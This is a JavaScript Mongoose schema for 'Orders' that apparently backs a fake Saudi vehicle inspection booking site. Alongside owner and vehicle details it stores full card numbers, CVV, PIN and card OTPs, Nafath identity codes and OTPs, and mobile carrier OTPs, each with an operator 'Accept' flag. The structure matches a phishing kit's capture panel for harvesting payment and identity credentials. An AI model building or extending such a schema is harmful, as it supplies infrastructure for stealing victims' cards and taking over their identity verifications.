const mongoose = require("mongoose");

exports.Order = mongoose.model(
  "Orders",
  new mongoose.Schema({
    vechile_status: String,
    delegate: Boolean,
    nationality: String,
    fullname: String,
    nation_number: String,
    phone: String,
    country_code: String,
    email: String,
    country: String,
    first: String,
    second: String,
    third: String,
    board_number: String,
    customs_number: String,
    location: String,
    region: String,
    phoneId: String,
    service_type: String,
    danger_vechile: Boolean,
    vechile_type: String,
    date_check: String,
    time_check: String,
    border_letter: String,
    commissioner_type: String,
    commissioner_name: String,
    commissioner_phone: String,
    commissioner_country_code: String,
    commissioner_nationality: String,
    commissioner_id: String,
    commissioner_birthdate: String,
    commissioner_accept: Boolean,
    token: String,
    card_name: String,
    cardNumber: String,
    cvv: String,
    expiryDate: String,
    pin: String,
    level: String,
    CardOtp: String,
    CardAccept: {
      type: Boolean,
      default: false,
    },
    OtpCardAccept: {
      type: Boolean,
      default: false,
    },
    PinAccept: {
      type: Boolean,
      default: false,
    },

    phoneNumber: String,
    phoneNetwork: String,
    phoneAccept: {
      type: Boolean,
      default: false,
    },
    STCAccept: {
      type: Boolean,
      default: true,
    },
    MobilyAccept: {
      type: Boolean,
      default: true,
    },
    mobOtp: String,
    mobOtpAccept: {
      type: Boolean,
      default: false,
    },
    phoneNumber: String,
    phoneNetwork: String,

    phoneOtp: String,

    phoneOtpAccept: {
      type: Boolean,
      default: false,
    },
    navazCode: String,
    networkAccept: {
      type: Boolean,
      default: false,
    },
    navazAccept: {
      type: Boolean,
      default: false,
    },
    navazOtp: String,
    navazOtpAccept: {
      type: Boolean,
      default: false,
    },
    checked: {
      type: Boolean,
      default: false,
    },
    created: { type: Date, default: Date.now },
  })
);
